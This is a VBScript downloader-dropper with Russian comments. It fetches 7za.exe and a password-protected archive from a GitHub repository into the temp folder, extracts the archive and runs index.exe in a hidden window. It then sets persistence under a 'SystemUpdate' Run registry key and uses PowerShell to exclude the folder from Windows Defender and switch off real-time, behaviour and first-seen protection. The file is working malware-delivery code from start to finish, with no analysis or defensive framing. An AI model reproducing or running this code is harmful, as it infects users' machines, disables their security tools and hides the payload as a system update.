Dim oShell, objFSO, objHTTP, objFile, strTemp, strURL, strZipFile, strExtractTo, strPassword, strExeFile, str7zPath, str7zURL, objADO
Set oShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objHTTP = CreateObject("MSXML2.XMLHTTP")
Set objADO = CreateObject("ADODB.Stream")

strTemp = oShell.ExpandEnvironmentStrings("%TEMP%")
strURL = "https://github.com/nyamonlight/WARNINGFILESVIRUS/raw/refs/heads/main/index.zip"
str7zURL = "https://github.com/nyamonlight/WARNINGFILESVIRUS/raw/refs/heads/main/7za.exe"
strZipFile = strTemp & "\index.zip"
strExtractTo = strTemp & "\extracted"
strPassword = "12345"
strExeFile = strExtractTo & "\index.exe"
str7zPath = strTemp & "\7za.exe"

' Функция скачивания бинарного файла
Function DownloadBinary(url, savePath)
    On Error Resume Next
    Dim http, stream
    Set http = CreateObject("MSXML2.XMLHTTP")
    http.Open "GET", url, False
    http.Send
    
    If http.Status = 200 Then
        Set stream = CreateObject("ADODB.Stream")
        stream.Type = 1 ' adTypeBinary
        stream.Open
        stream.Write http.ResponseBody
        stream.SaveToFile savePath, 2 ' adSaveCreateOverWrite
        stream.Close
        DownloadBinary = True
    Else
        DownloadBinary = False
    End If
    
    Set http = Nothing
    Set stream = Nothing
End Function

' Скачиваем 7za.exe
If Not objFSO.FileExists(str7zPath) Then
    If Not DownloadBinary(str7zURL, str7zPath) Then
        MsgBox "Failed to download 7za.exe"
        WScript.Quit
    End If
End If

' Скачиваем архив
If Not DownloadBinary(strURL, strZipFile) Then
    MsgBox "Failed to download archive"
    WScript.Quit
End If

' Создаём папку
If Not objFSO.FolderExists(strExtractTo) Then
    objFSO.CreateFolder(strExtractTo)
End If

' Распаковываем с паролем через 7za
Dim cmd
cmd = """" & str7zPath & """ x -y -p" & strPassword & " -o""" & strExtractTo & """ """ & strZipFile & """"
oShell.Run cmd, 0, True

' Запускаем EXE
If objFSO.FileExists(strExeFile) Then
    oShell.Run strExeFile, 0, False
    oShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\SystemUpdate", strExeFile
    oShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SystemUpdate", strExeFile
    oShell.Run "powershell -Command Add-MpPreference -ExclusionPath " & strExtractTo, 0, True
    oShell.Run "powershell -Command Set-MpPreference -DisableRealtimeMonitoring $true", 0, True
    oShell.Run "powershell -Command Set-MpPreference -DisableBehaviorMonitoring $true", 0, True
    oShell.Run "powershell -Command Set-MpPreference -DisableBlockAtFirstSeen $true", 0, True
End If

Set objHTTP = Nothing
Set objFSO = Nothing
Set oShell = Nothing
Set objADO = Nothing